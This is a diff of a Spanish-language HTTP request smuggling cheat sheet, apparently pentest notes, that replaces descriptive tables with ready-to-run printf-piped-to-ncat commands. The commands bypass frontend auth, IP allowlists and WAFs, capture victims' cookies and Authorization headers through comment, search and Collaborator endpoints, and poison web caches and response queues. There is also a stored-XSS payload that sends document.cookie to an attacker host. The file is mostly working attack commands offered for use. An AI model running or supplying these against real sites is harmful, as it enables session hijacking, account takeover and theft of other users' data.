@@ -25,40 +25,33 @@ linked:
 
 ## Bypass de Front-end Controls
 
-| **Objetivo** | **Smuggled request** | **Resultado** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Bypass auth check | `GET /admin HTTP/1.1\r\nHost: target\r\n\r\n` | Front valida session en `/`, smuggled `/admin` ya pasó por front. |
-| Bypass IP allowlist | Smuggle `GET /admin` cuando front filtra `/admin` por IP | Backend recibe sin filtros del front. |
-| Bypass WAF rules | Smuggle SQLi/XSS payload que WAF bloquea en path normal | WAF en front no ve smuggled (queda en buffer). |
-| Bypass rate limit | Múltiples requests dentro de uno smuggled | Rate limiter cuenta solo el outer request. |
-| Bypass header injection blocking | Inyectar headers que front filtra (`X-Forwarded-For`, `X-Real-IP`) | Si back trustea esos headers de internal hops. |
-| Bypass por path | `GET /private/data HTTP/1.1` | Endpoints internos. |
-| Bypass por método | `PUT /admin/config HTTP/1.1` | Métodos restringidos por front. |
-| Bypass cliente cert | Smuggle request que no pasa mTLS check | Si TLS termina en front. |
-| Acceder API interna | `GET /api/internal/users HTTP/1.1\r\nHost: internal-api.local\r\n\r\n` | Cambiar Host para alcanzar virtual host interno. |
-| Reach localhost endpoints | `GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n` | Si back routea por Host header. |
+| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` | Bypass auth check del frontend para `/admin` | Frontend valida session en `/`, smuggled `/admin` ya pasó. |
+| `printf 'POST / ... \r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n' \| ncat target 80` | Bypass IP allowlist + admin path | Backend trustea XFF del internal hop. |
+| `printf '... \r\n\r\n0\r\n\r\nPOST /api/x HTTP/1.1\r\nHost: target\r\nContent-Length: 50\r\n\r\n<SQLi payload>' \| ncat target 80` | Bypass WAF que bloquea SQLi en path normal | WAF en front no ve smuggled. |
+| `printf '... \r\n\r\n0\r\n\r\nGET /api/internal/users HTTP/1.1\r\nHost: internal-api.local\r\n\r\n' \| ncat target 80` | Reach internal vhost via Host injection en smuggled | Backend routea por Host. |
+| `printf '... \r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n' \| ncat target 80` | Reach localhost endpoint | Si back routea por Host. |
+| `printf '... \r\n\r\n0\r\n\r\nPUT /admin/config HTTP/1.1\r\nHost: target\r\nContent-Length: 20\r\n\r\nconfig=evil' \| ncat target 80` | Smuggle PUT method bloqueado en front | Method-restricted endpoint. |
 ^hrs-exploit-bypass
 
 ___
 
 ## Request Capture / Hijack
 
-| **Objetivo** | **Payload** | **Resultado** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Capturar próxima request user | Smuggle request con body grande + `Content-Length` muy largo | Próxima request del user concatena al body smuggleado → atacante recibe en log endpoint. |
-| Setup endpoint logger | Smuggle `POST /comment HTTP/1.1\r\nHost: target\r\nContent-Length: 1000\r\n\r\n` | Body capturará 1000 bytes de la próxima victim request (incluyendo cookies / Authorization). |
-| Steal cookie victim | Smuggle pega `Cookie: session=...` (de victim) en endpoint público (comment / search) | Aparece en página visible. |
-| Steal Authorization header | Smuggle a endpoint reflective | Atacante lee response. |
-| Steal body POST victim | Si victim manda POST con creds, smuggle captura | Funciona para login forms. |
-| Sobre XHR / CSRF tokens | Smuggle hace que próxima request del user sea reflejada con token incluido | Hijack token. |
-| Burp Collaborator log | Smuggle `POST /attacker.oast.fun/log HTTP/1.1\r\nContent-Length: 1024\r\n\r\n` | Captura headers de víctimas en Collaborator. |
-| Length para captura | Calcular CL para alcanzar Cookie/Auth típicos (~500-1500 bytes) | Si muy chico → cortado, si muy largo → timeout. |
+| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 297\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /comment HTTP/1.1\r\nHost: target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 200\r\n\r\ncomment=' \| ncat target 80` | Smuggle hace que próxima request user se concatena al comment field | Endpoint reflective + length 200. |
+| Post-smuggle: víctima envía request → su Cookie/Authorization queda en `comment` body → cualquiera ve en `/comments` | Cookie/Auth steal de víctima random | Multi-step capture. |
+| `printf '... 0\r\n\r\nPOST /search HTTP/1.1\r\nHost: target\r\nContent-Length: 1000\r\n\r\nq=' \| ncat target 80` | Search endpoint reflective con CL=1000 captura request completo | Search-based capture. |
+| Burp HTTP Request Smuggler → "Smuggle attack" → "Capture next request" mode | Auto-setup capture endpoint | Tool-driven. |
+| `printf '... 0\r\n\r\nPOST /api/log HTTP/1.1\r\nHost: attacker.oast.fun\r\nContent-Length: 1024\r\n\r\n' \| ncat target 80` | Smuggle log a Burp Collaborator con CL=1024 | OOB capture. |
+| Calculate CL: `python3 -c "print(len('POST /comment ...\r\n\r\n'))"` | Calc bytes para alcanzar Cookie/Auth típicos (500-1500) | Byte-precise. |
 ^hrs-exploit-capture
 
 ### Setup completo capture
 
 ```http
-[Outer request CL.TE]
 POST / HTTP/1.1
 Host: target.com
 Content-Length: 297
@@ -74,69 +67,45 @@ Content-Length: 200
 comment=
 ```
 
-Después de smuggle, próxima request del user se concatena al `comment=` form. Si user manda `GET /home HTTP/1.1\r\nCookie: session=abc...\r\n\r\n` → todo eso queda como valor del comment → atacante lo ve público en `/comments`.
+Próxima request user se concatena al `comment=`. Si user manda `GET /home HTTP/1.1\r\nCookie: session=abc...` → todo queda como valor del comment → atacante lo ve público en `/comments`.
 
 ___
 
 ## Web Cache Poisoning vía Smuggle
 
-| **Objetivo** | **Payload** | **Resultado** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Smuggle response de path X que cachea response de path Y | Cache asocia URL víctima a contenido controlado. |
-| Setup | Smuggle `GET / HTTP/1.1\r\nHost: target\r\n\r\n` | Próxima request user a `/static/js/app.js` recibe response del smuggle (que era para `/`). Cache key = `/static/js/app.js` con contenido de `/`. |
-| Chain con XSS reflejado | Smuggle a endpoint con XSS en query → response con XSS cacheada como `/index.html` | Persistent XSS sin auth. |
-| Chain con redirect controlado | Smuggle a endpoint con redirect open | Cache redirect malicioso. |
-| Chain con error custom | Smuggle a `/notfound` → response con HTML controlado | Cache error page hostil. |
-| Combine Vary header | Si cache respeta `Vary: User-Agent` etc — bypass via consistent UA | Cache hit fiable. |
-| TTL del cache | Cache poisoning persiste segundos a horas según TTL | Más impacto = TTL largo. |
-| Combine con web cache deception | Smuggle + path confusion | Stack vector. |
+| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/js/app.js HTTP/1.1\r\nHost: attacker.com\r\n\r\n' \| ncat target 80` | Cache associa `/static/js/app.js` con response del smuggled (Host attacker) | Cache poison via smuggle. |
+| `printf '... 0\r\n\r\nGET /index.html HTTP/1.1\r\nHost: target\r\nReferer: <script>alert(1)</script>\r\n\r\n' \| ncat target 80` | XSS reflejado cached como index | Reflected XSS cacheado. |
+| Burp HTTP Request Smuggler → "Cache poisoning via smuggling" mode | Auto-setup combo | Tool-driven. |
+| Validation: `curl -sI https://target/static/js/app.js \| grep -iE 'x-cache\|age:'` post-smuggle | Confirm cache hit con poisoned content | Post-attack verify. |
+| `printf '... 0\r\n\r\nGET /notfound HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` (con response controlado) | Cached error page hostil | Custom 404 cache poison. |
 ^hrs-exploit-cache
 
 ___
 
 ## Response Queue Poisoning
 
-| **Objetivo** | **Payload** | **Resultado** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Smuggle desincroniza queue de responses → atacante recibe response destinada a victim | Permanent desync — back-end conn nunca se recupera. |
-| Mecanismo | Smuggle 2 requests dentro de 1 → back genera 2 responses → front leyó solo 1 → siguiente response queda asociada a próxima request | Atacante hace request normal + recibe response de víctima. |
-| Setup multi-request smuggle | Smuggle `GET / + GET /` (2 requests) | Genera 2 responses extras en queue. |
-| Trigger timing | Atacante manda request y monitorea responses raras | Recibe response con cookies de otro user. |
-| Burp Repeater queue | "Send group → in single connection" | Reproducible con setup correcto. |
-| HTTP/2 queue poison | H2 multiplexing dificulta — pero downgrade a H1 reaviva el vector | Combine con H2.CL/H2.TE. |
-| Persistencia | Una vez desyncado, conn queda permanente desyncada hasta close | Loop de robos. |
-| Steal credentials | Si victim hace login → response del login (con cookie set) llega al atacante | Account takeover automático. |
+| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 80\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\n\r\n' \| ncat target 80` | Smuggle multi-request → backend genera N+1 responses | Queue desync. |
+| Atacante request normal post-smuggle: `curl -v https://target/` → recibe response de víctima random | Response queue poisoning explotación | Persistent desync hasta TCP close. |
+| Burp Repeater group "Send in single connection" con outer + multi-smuggle | Reproducible con setup correcto | Burp Pro. |
+| Post-poison: monitorear responses con `curl -v https://target/` repetido — buscar Set-Cookie no propio | Steal session cookies de víctimas | Session hijack automático. |
+| Burp HTTP Request Smuggler → "Queue poisoning" mode | Auto-setup queue desync | Tool-driven. |
 ^hrs-exploit-queue
-
-### Stylesheet response queue poison
-
-```
-[Atacante envía smuggle multi-request]
-POST / HTTP/1.1 (+ smuggled GET / GET /)
-
-[Back-end genera 3 responses para 1 request del front]
-[Front-end devuelve 1 al atacante]
-[2 responses extras quedan en queue]
-
-[Victim hace GET /home]
-[Front-end le devuelve la response que sobró del atacante = posiblemente con cookie del último user]
-[Próximas víctimas reciben responses corridas]
-```
 
 ___
 
 ## Reflected XSS Chain via Smuggling
 
-| **Objetivo** | **Payload** | **Resultado** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Smuggle request con XSS reflejada en User-Agent → response cacheada con script | Persistent XSS sin necesidad de social engineering. |
-| Setup | Smuggle `GET / HTTP/1.1\r\nUser-Agent: <script>alert(1)</script>\r\nHost: target\r\n\r\n` | Si app refleja UA en response y cache la guarda. |
-| Bypass de UA filter | UA con XSS payload escapa filtros aplicados solo a query params | App suele no filtrar headers. |
-| Combine con cache poison | Smuggle response cacheada como `/index.html` | Todo user ve XSS. |
-| XSS to ATO | XSS en autenticated context → robar cookies → ATO | Chain completo. |
-| Stored-via-smuggle | Smuggle a endpoint que persiste el body (comments) | Persistent sin necesidad de cache. |
-| HTML injection sin XSS | Smuggle inyecta `<meta refresh>` en response | Phishing redirect. |
-| Web cache deception combo | Smuggle + path traversal en cache | Persiste con TTL largo. |
+| `printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 80\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\nUser-Agent: <script>alert(1)</script>\r\n\r\n' \| ncat target 80` | XSS via UA reflexion smuggled | App refleja User-Agent en response. |
+| Combine con cache: smuggle UA-XSS → response cached como `/index.html` → todos los users ven XSS | Persistent XSS via cache | Mass impact. |
+| `printf '... 0\r\n\r\nPOST /comment HTTP/1.1\r\nHost: target\r\nContent-Length: 60\r\n\r\ntext=<script>document.location=\"//attacker?\"+document.cookie</script>' \| ncat target 80` | Stored XSS via smuggled comment | App persiste body. |
+| `printf '... 0\r\n\r\nGET / HTTP/1.1\r\nHost: target\r\nReferer: javascript:alert(document.cookie)\r\n\r\n' \| ncat target 80` | Referer-reflection XSS smuggled | Referer reflejado. |
+| Combine cache: post-smuggle verificar `curl https://target/ \| grep -i "<script"` | Cache poison persiste XSS | Multi-victim impact. |
 ^hrs-exploit-xss
 
 ***
